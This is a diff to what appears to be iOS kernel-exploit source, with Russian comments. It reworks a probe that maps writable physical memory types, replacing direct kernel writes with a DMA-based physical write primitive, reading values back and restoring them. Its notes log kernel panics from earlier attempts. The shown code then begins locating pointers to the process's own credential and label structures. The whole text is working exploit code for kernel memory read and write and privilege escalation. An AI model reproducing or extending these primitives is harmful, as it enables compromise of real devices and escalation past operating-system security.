@@ -8143,7 +8143,10 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 {
                     kpNote(r, @"  [WRIMAP] старт: карта пишущегося ядра");
                     uint64_t wB = kconstant(physBase), wN = kconstant(physSize) >> 14;
-                    // --- A: тип-матрица ---
+                    // --- A: тип-матрица (ТОЛЬКО DMA-пробы: kwrite по алиасу
+                    // 0xb/0x18 = aperture fault → паника 12:06:50; kwrite-безопасен
+                    // только 0x21 — это уже доказано). DMA молча дропает RO-кадры.
+                    kpNote(r, @"  [WRIMAP] kwrite-апертура: RW только у типа 0x21 (паники 10:17/12:06 — факты). Матрица — DMA-пробами.");
                     int wTypes[7] = { 0x0b, 0x0e, 0x21, 0x13, 0x11, 0x17, 0x37 };
                     for (int wi = 0; wi < 7; wi++) {
                         int t = wTypes[wi];
@@ -8156,12 +8159,16 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                         uint64_t al = phystokv(tp);
                         if (!al) continue;
                         uint64_t v0 = early_kread64(al + 0x100);
-                        early_kwrite64(al + 0x100, v0 + 1);
+                        // DMA-проба: пишем v0+1 через фабрику, смотрим readback, возвращаем v0
+                        // (restore тоже DMA — early_kwrite по алиасу 0xb/0x18 = паника!)
+                        BOOL d1 = svc && tsdV && ttM && isTable ?
+                            kpPhysWrite8v2(svc, tsdV, ttM, isTable, tp, 0x100, v0 + 1, r) : NO;
                         uint64_t v1 = early_kread64(al + 0x100);
-                        early_kwrite64(al + 0x100, v0);
-                        kpNote(r, [NSString stringWithFormat:@"  [WRIMAP] тип 0x%x: pa=%#llx %#llx→%#llx — %@",
-                                  t, (unsigned long long)tp, (unsigned long long)v0, (unsigned long long)v1,
-                                  v1 == v0 + 1 ? @"ПИШЕТСЯ ★" : @"RO"]);
+                        if (d1 && v1 != v0 && svc && tsdV && ttM && isTable)
+                            kpPhysWrite8v2(svc, tsdV, ttM, isTable, tp, 0x100, v0, r);
+                        kpNote(r, [NSString stringWithFormat:@"  [WRIMAP] тип 0x%x: pa=%#llx %#llx→%#llx DMA=%d — %@",
+                                  t, (unsigned long long)tp, (unsigned long long)v0, (unsigned long long)v1, d1,
+                                  v1 == v0 + 1 ? @"DMA-ПИШЕТСЯ ★" : @"DMA-RO/дроп"]);
                     }
                     // --- B: selfTask — ищем указатели на наш cred/label ---
                     uint64_t stVA = task_self();
